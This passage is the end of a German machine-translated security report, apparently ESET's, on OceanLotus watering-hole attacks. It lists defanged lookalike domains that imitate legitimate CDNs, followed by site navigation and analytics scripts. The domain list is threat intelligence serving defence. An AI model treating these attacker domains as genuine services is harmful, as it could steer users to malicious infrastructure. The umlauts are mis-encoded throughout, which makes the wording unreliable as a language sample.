cdn.ampproject.com <br>  - bootstraplink [.] Com / getbootstrap.com <br>  - sskimresources [.] Com / s.skimresources.com <br>  - widgets-wp [.] Com / widgets.wp.com <br><br>  Die Anzahl der verwendeten Dom√§nen und ihre √Ñhnlichkeit mit legitimen Websites kann die Erkennung durch eine Person erschweren, die den Netzwerkverkehr anzeigt. <br><br><h3>  Fazit </h3><br>  Trotz der Aufmerksamkeit von Sicherheitsforschern greift OceanLotus weiterhin erfolgreich Ziele in S√ºdostasien an.  Dar√ºber hinaus verbessert die Gruppe die Tools, indem sie ein Framework f√ºr Wasserlochangriffe, eine Malware f√ºr Windows und MacOS in ihr Arsenal aufnimmt.  J√ºngste in diesem Bericht diskutierte Framework-Updates zeigen, dass Angreifer ihre F√§higkeiten verbessert haben. <br><br>  Um die Anzahl m√∂glicher Opfer zu begrenzen, haben wir die Eigent√ºmer der gef√§hrdeten Websites benachrichtigt und erkl√§rt, wie der sch√§dliche JavaScript-Code entfernt werden kann.  Einige von ihnen zeigten jedoch keine Bereitschaft, Informationen und Unterst√ºtzung anzunehmen. <br><br>  ESET-Forscher werden die Entwicklung der OceanLotus-Gruppe weiterhin √ºberwachen.  Kompromissindikatoren finden Sie auf <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">GitHub</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de436136/">https://habr.com/ru/post/de436136/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de436126/index.html">Kubernetes: Erstellen von Docker-Images in einem Cluster</a></li>
<li><a href="../de436128/index.html">Interview mit Baghunter Artyom Moskau. Er hackte Steam und erhielt die gr√∂√üte Auszeichnung in der Geschichte von Valve.</a></li>
<li><a href="../de436130/index.html">Das Projekt des Ministeriums f√ºr Telekommunikation und Massenkommunikation zur √úbertragung des Internetverkehrs √ºber russische Sender erschwert die Legalisierung von OneWeb in Russland</a></li>
<li><a href="../de436132/index.html">12 seltsame Dinge, die nach der Installation des npm-Pakets passieren k√∂nnen</a></li>
<li><a href="../de436134/index.html">Auf Importrouter werden bis zu 20% Sperrz√∂lle erhoben</a></li>
<li><a href="../de436140/index.html">"Unter der Haube" des Huawei-Speichers: propriet√§re Technologien und was andere nicht haben</a></li>
<li><a href="../de436144/index.html">Blutsaugende Chefs im Kontext einer Bioz√∂nose: Warum sich ein selbstverwaltendes Team aufl√∂st, wenn es nicht zentralisiert ist</a></li>
<li><a href="../de436148/index.html">Die Geschichte eines Junioren - wie man anf√§ngt zu arbeiten und keine Angst vor allem hat</a></li>
<li><a href="../de436150/index.html">Konfigurieren Sie die Ger√§tedaten√ºbertragung zu AWS IoT Core</a></li>
<li><a href="../de436152/index.html">Der Fehler, der mich gesch√§ftsorientiertes Design lehrte</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>